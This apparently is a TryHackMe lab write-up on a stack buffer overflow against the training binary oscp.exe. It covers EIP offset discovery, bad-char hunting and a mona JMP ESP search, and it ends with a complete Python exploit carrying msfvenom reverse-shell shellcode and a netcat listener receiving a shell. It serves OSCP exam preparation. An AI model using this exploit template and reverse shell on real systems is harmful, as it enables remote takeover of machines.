---
title: THM - Buffer Overflow Prep
tags: [thm, bof] 
---

<div style="text-align:center;">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/1948e2c67f072993904cec82f39653c0.png" alt="Challenge logo" style="height:150px;">
</div>

## Deploy VM

Please note that this room does not teach buffer overflows from scratch. It is intended to help OSCP students and also bring to their attention some features of mona which will save time in the OSCP exam.

We have to deploy the machine and log into it using RDP and the credentials we just found.

```
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.124.89 /workarea
```

## oscp.exe - OVERFLOW1

Launch Immunity Debugger as Administrator, then click "Open" or "Attach" the `oscp.exe` file.

![](/assets/img/bof-prep-open-file.PNG) 

On the top we can see a little red play button. Click it to run the application. A terminal should open and should confirm that the application has been successfully executed.

![](/assets/img/bof-prep-oscp-start.PNG) 

Set the current working directory

```
!mona config -set workingfolder c:\mona\%p
```

Let's write a simple python3 script that would connect to the service and send a certain number of `A` letters as input. This would hopefully find the minimum number of characters needed to crash the application. Start with 100 chars and increase it until the application stops working.

```python
#!/usr/bin/env python3

import socket

address, port = "10.10.49.169", 1337

payload = b"".join([
  b"OVERFLOW1 ",
  b"A" * 2500
])

with socket.socket() as s:
  s.connect((address, port))
  s.send(payload)
```

I found the application breaks with 2500 characters. We can clearly see what happened to the application registers.

![](/assets/img/bof-prep-crash-registers.PNG) 

Pay special attention to EIP (Instruction Pointer). We successfully overwrite it's value with `414141` (hexadecimal representation for `AAAA`). This indicates that, if we can find the minimum number of chars needed to overwrite everything before EIP, we can inject in it any address we want and change the workflow of the application. To find that "sweet spot" we can use what is called a cyclic pattern and than, looking at the EIP value after the crash, we can determine how many bytes came before it. Luckly we don't have to do this manually and we can use some tools.

Generate a cyclic pattern (remember to set the same length as the one you use to crash the application) 

```
$ /opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 2500

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D
```

Copy and paste this instead of the `A` characters in the python script, restart Immunity and run the exploit. We successfully crashed the application once again and we can see we overwrite the EIP register with some values rather than `41414141`.

![](/assets/img/bof-prep-eip-cyclic.PNG) 

Copy its value and run this command

```
$ /opt/metasploit-framework-5101/tools/exploit/pattern_offset.rb -q 6F43396E

[*] Exact match at offset 1978
```
We successfully find EIP's offset. This means that after `1978` chars, we start to overwrite the register's value. We can confirm this with the following changes to the exploit.

```python
#!/usr/bin/env python3

import socket

address, port = "10.10.49.169", 1337
offset = 1978
eip = b"BBBB"

payload = b"".join([
  b"OVERFLOW1 ",
  b"A" * offset,
  eip,
  b"C" * (2500 - offset - len(eip)),
])

with socket.socket() as s:
  s.connect((address, port))
  s.send(payload)
```

The exploit will now send 1978 "junk chars", `BBBB` (that sould overwrite EIP value) and some `C` chars to continue sending 2500 chars in total. Restart Immunity and run the exploit. We can see that we overwrite EIP with `42424242` (hex representation for `BBBB`).

![](/assets/img/bof-prep-eip-injection.PNG) 

We can control EIP value!

The exploitation path is pretty straightforward: we have to find some JMP ESP instruction, inject our shellcode into the stack and jump to it to execute it and gain full control over the host machine. Bad chars, also called invalid characters, are characters received and filtered by the target program that serve as delimeters. The search for badchars is a crucial part in the metodology of developing exploits, since, if they are not located and avoided during the generation of the payload, they make it useless because it would not be interpreted correctly in the largest system.

We have to generate all chars from 0 to 255 and give them to the application. We can than look which ones are not correctly interpreted: those ones are bad chars and have to be exluded from the final exploit. Make the following changes to the exploit

```python
#!/usr/bin/env python3

import socket

address, port = "10.10.49.169", 1337
offset = 1978
eip = b"BBBB"
all_chars = bytearray(range(0, 256))
bad_chars = [
  b"\x00",
]

for char in bad_chars:
  all_chars = all_chars.replace(char, b"")

payload = b"".join([
  b"OVERFLOW1 ",
  b"A" * offset,
  eip,
  all_chars,
  b"C" * (2500 - offset - len(eip) - len(all_chars)),
])

with socket.socket() as s:
  s.connect((address, port))
  s.send(payload)
```

We will save all possible chars from `\x00` to `\xff` in `all_chars` array and all bad chars in the `bad_chars` array. At every execution, we will add a bad char in the array and we will exclude it from the final payload (we know that character is not interpreted and is useless to send it another time). I already put `\x00` in the bad chars array.

As usual, restart Immunity and run the exploit. After it's execution place your cursor over the ESP register, right click and "Follow in dump". In the lower left window we can see the stack dump.

![](/assets/img/bof-prep-stack-dump.PNG) 

Start examining the dump to find characters that don't follow the order. These characters indicate the value that should be there wasn't interpreted correctly. In the first execution we can clearly see how `\x07` was not interpreted (`\x06` is not followed by `\x07` and instead some strange values are present). Add it to the respective array, restart Immunity and execute the exploit. 

![](/assets/img/bof-prep-exclude-bad-char.PNG) 

We successfully find one bad char. Continue this process until no more invalid characters are found. At the end, the list of bad chars should be:

```
\x00\x07\x2e\xa0
```

We have to find a `JMP ESP` instruction with address that don't contain any bad char. Type the following command in Immunity

```
!mona jmp -r esp -cpb "\x00\x07\x2e\x0a"
```

In the log panel we should see all the instructions.

![](/assets/img/bof-prep-jmp-esp.PNG) 

Let's get one (we usually search the one with less security controls enabled). This address, written in little endian, is the one with which we will overwrite the EIP register.

We have to generate the shellcode without the invalid chars. Luckly we can use msfvenom with the following sintax

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.54.39 LPORT=4242 -f py -v shellcode -b "\x00\x07\x2e\xa0"

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1965 bytes
shellcode =  b""
shellcode += b"\xd9\xca\xbb\x6e\xdd\x1c\x04\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x52\x31\x5a\x17\x83\xea\xfc"
shellcode += b"\x03\x34\xce\xfe\xf1\x34\x18\x7c\xf9\xc4\xd9"
shellcode += b"\xe1\x73\x21\xe8\x21\xe7\x22\x5b\x92\x63\x66"
shellcode += b"\x50\x59\x21\x92\xe3\x2f\xee\x95\x44\x85\xc8"
shellcode += b"\x98\x55\xb6\x29\xbb\xd5\xc5\x7d\x1b\xe7\x05"
shellcode += b"\x70\x5a\x20\x7b\x79\x0e\xf9\xf7\x2c\xbe\x8e"
shellcode += b"\x42\xed\x35\xdc\x43\x75\xaa\x95\x62\x54\x7d"
shellcode += b"\xad\x3c\x76\x7c\x62\x35\x3f\x66\x67\x70\x89"
shellcode += b"\x1d\x53\x0e\x08\xf7\xad\xef\xa7\x36\x02\x02"
shellcode += b"\xb9\x7f\xa5\xfd\xcc\x89\xd5\x80\xd6\x4e\xa7"
shellcode += b"\x5e\x52\x54\x0f\x14\xc4\xb0\xb1\xf9\x93\x33"
shellcode += b"\xbd\xb6\xd0\x1b\xa2\x49\x34\x10\xde\xc2\xbb"
shellcode += b"\xf6\x56\x90\x9f\xd2\x33\x42\x81\x43\x9e\x25"
shellcode += b"\xbe\x93\x41\x99\x1a\xd8\x6c\xce\x16\x83\xf8"
shellcode += b"\x23\x1b\x3b\xf9\x2b\x2c\x48\xcb\xf4\x86\xc6"
shellcode += b"\x67\x7c\x01\x11\x87\x57\xf5\x8d\x76\x58\x06"
shellcode += b"\x84\xbc\x0c\x56\xbe\x15\x2d\x3d\x3e\x99\xf8"
shellcode += b"\x92\x6e\x35\x53\x53\xde\xf5\x03\x3b\x34\xfa"
shellcode += b"\x7c\x5b\x37\xd0\x14\xf6\xc2\xb3\x10\x0d\xfa"
shellcode += b"\x64\x4d\x13\x02\x7b\x1f\x9a\xe4\x11\x0f\xcb"
shellcode += b"\xbf\x8d\xb6\x56\x4b\x2f\x36\x4d\x36\x6f\xbc"
shellcode += b"\x62\xc7\x3e\x35\x0e\xdb\xd7\xb5\x45\x81\x7e"
shellcode += b"\xc9\x73\xad\x1d\x58\x18\x2d\x6b\x41\xb7\x7a"
shellcode += b"\x3c\xb7\xce\xee\xd0\xee\x78\x0c\x29\x76\x42"
shellcode += b"\x94\xf6\x4b\x4d\x15\x7a\xf7\x69\x05\x42\xf8"
shellcode += b"\x35\x71\x1a\xaf\xe3\x2f\xdc\x19\x42\x99\xb6"
shellcode += b"\xf6\x0c\x4d\x4e\x35\x8f\x0b\x4f\x10\x79\xf3"
shellcode += b"\xfe\xcd\x3c\x0c\xce\x99\xc8\x75\x32\x3a\x36"
shellcode += b"\xac\xf6\x4a\x7d\xec\x5f\xc3\xd8\x65\xe2\x8e"
shellcode += b"\xda\x50\x21\xb7\x58\x50\xda\x4c\x40\x11\xdf"
shellcode += b"\x09\xc6\xca\xad\x02\xa3\xec\x02\x22\xe6"
```

Copy the dump and paste it into the exploit. This shellcode will start a TCP connection back at our machine once executed. Since we used an encoder to generate the shellcode, we need some space in memory for the payload to unpack itself. we can do this creating some NOPs (`\x90`).

The final exploit should look something like

```python
#!/usr/bin/env python3

import socket
import struct

address, port = "10.10.49.169", 1337

# EIP offset
offset = 1978

# JMP ESP instruction address packed in little endian
jmp_esp = struct.pack("<I", 0x625011AF)

# windows/shell_reverse_tcp shellcode 
shellcode =  b""
shellcode += b"\xd9\xca\xbb\x6e\xdd\x1c\x04\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x52\x31\x5a\x17\x83\xea\xfc"
shellcode += b"\x03\x34\xce\xfe\xf1\x34\x18\x7c\xf9\xc4\xd9"
shellcode += b"\xe1\x73\x21\xe8\x21\xe7\x22\x5b\x92\x63\x66"
shellcode += b"\x50\x59\x21\x92\xe3\x2f\xee\x95\x44\x85\xc8"
shellcode += b"\x98\x55\xb6\x29\xbb\xd5\xc5\x7d\x1b\xe7\x05"
shellcode += b"\x70\x5a\x20\x7b\x79\x0e\xf9\xf7\x2c\xbe\x8e"
shellcode += b"\x42\xed\x35\xdc\x43\x75\xaa\x95\x62\x54\x7d"
shellcode += b"\xad\x3c\x76\x7c\x62\x35\x3f\x66\x67\x70\x89"
shellcode += b"\x1d\x53\x0e\x08\xf7\xad\xef\xa7\x36\x02\x02"
shellcode += b"\xb9\x7f\xa5\xfd\xcc\x89\xd5\x80\xd6\x4e\xa7"
shellcode += b"\x5e\x52\x54\x0f\x14\xc4\xb0\xb1\xf9\x93\x33"
shellcode += b"\xbd\xb6\xd0\x1b\xa2\x49\x34\x10\xde\xc2\xbb"
shellcode += b"\xf6\x56\x90\x9f\xd2\x33\x42\x81\x43\x9e\x25"
shellcode += b"\xbe\x93\x41\x99\x1a\xd8\x6c\xce\x16\x83\xf8"
shellcode += b"\x23\x1b\x3b\xf9\x2b\x2c\x48\xcb\xf4\x86\xc6"
shellcode += b"\x67\x7c\x01\x11\x87\x57\xf5\x8d\x76\x58\x06"
shellcode += b"\x84\xbc\x0c\x56\xbe\x15\x2d\x3d\x3e\x99\xf8"
shellcode += b"\x92\x6e\x35\x53\x53\xde\xf5\x03\x3b\x34\xfa"
shellcode += b"\x7c\x5b\x37\xd0\x14\xf6\xc2\xb3\x10\x0d\xfa"
shellcode += b"\x64\x4d\x13\x02\x7b\x1f\x9a\xe4\x11\x0f\xcb"
shellcode += b"\xbf\x8d\xb6\x56\x4b\x2f\x36\x4d\x36\x6f\xbc"
shellcode += b"\x62\xc7\x3e\x35\x0e\xdb\xd7\xb5\x45\x81\x7e"
shellcode += b"\xc9\x73\xad\x1d\x58\x18\x2d\x6b\x41\xb7\x7a"
shellcode += b"\x3c\xb7\xce\xee\xd0\xee\x78\x0c\x29\x76\x42"
shellcode += b"\x94\xf6\x4b\x4d\x15\x7a\xf7\x69\x05\x42\xf8"
shellcode += b"\x35\x71\x1a\xaf\xe3\x2f\xdc\x19\x42\x99\xb6"
shellcode += b"\xf6\x0c\x4d\x4e\x35\x8f\x0b\x4f\x10\x79\xf3"
shellcode += b"\xfe\xcd\x3c\x0c\xce\x99\xc8\x75\x32\x3a\x36"
shellcode += b"\xac\xf6\x4a\x7d\xec\x5f\xc3\xd8\x65\xe2\x8e"
shellcode += b"\xda\x50\x21\xb7\x58\x50\xda\x4c\x40\x11\xdf"
shellcode += b"\x09\xc6\xca\xad\x02\xa3\xec\x02\x22\xe6"

# NOPs padding
padding = b"\x90" * 24

payload = b"".join([
  b"OVERFLOW1 ",
  b"A" * offset,
  jmp_esp,
  padding,
  shellcode,
  b"C" * (2500 - offset - len(jmp_esp) - len(padding) - len(shellcode)),
])

with socket.socket() as s:
  s.connect((address, port))
  s.send(payload)
```

Start a netcat listener and run the exploit.
```
$ nc -lvnp 4242

Listening on [0.0.0.0] (family 0, port 4242)
Connection from 10.10.49.169 49203 received!
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```

Et voilà